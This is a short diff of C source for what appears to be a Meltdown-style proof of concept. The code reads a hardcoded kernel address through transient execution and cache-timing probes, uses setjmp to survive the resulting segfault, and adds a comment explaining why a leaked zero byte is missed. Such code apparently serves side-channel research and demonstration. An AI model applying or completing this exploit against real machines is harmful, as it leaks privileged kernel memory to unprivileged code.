@@ -18,10 +18,8 @@ int main() {
 	unsigned char array[PAGE_SIZE*(256+1)];
 	unsigned int cycles_high_start, cycles_low_start,
 				 cycles_high_end, cycles_low_end;
-	unsigned long cycles;
-	unsigned long cycles_min = ~0;
-	int i;
-	int i_min = -1;
+	unsigned long cycles, cycles_min = ~0;
+	int i, i_min = -1;
 	unsigned char dummy;
 
 	// setup segfault handling
@@ -39,7 +37,13 @@ int main() {
         if(setjmp(context))
             goto end;
 
-        // FIXME: asm volatile ("" : : "b"(array+PAGE_SIZE));
+        // If we lose the race condition and %al is not loaded (or is even
+        // zeroed by the CPU) array[0] will be accessed. Below, the checks for
+        // cache misses start at array[PAGE_SIZE]. Therefore a cache hit for
+        // array[0] will never be detected... This is good because no false
+        // positives will exist due to losing the race condition. But it's bad
+        // because if the content of the address is actually 0 we will not
+        // detect that. FIXME
         asm volatile ("" : : "b"(array));
         asm volatile ("" : : "c"(0xffffffff81601448));
         asm volatile ("xorq %rax, %rax");
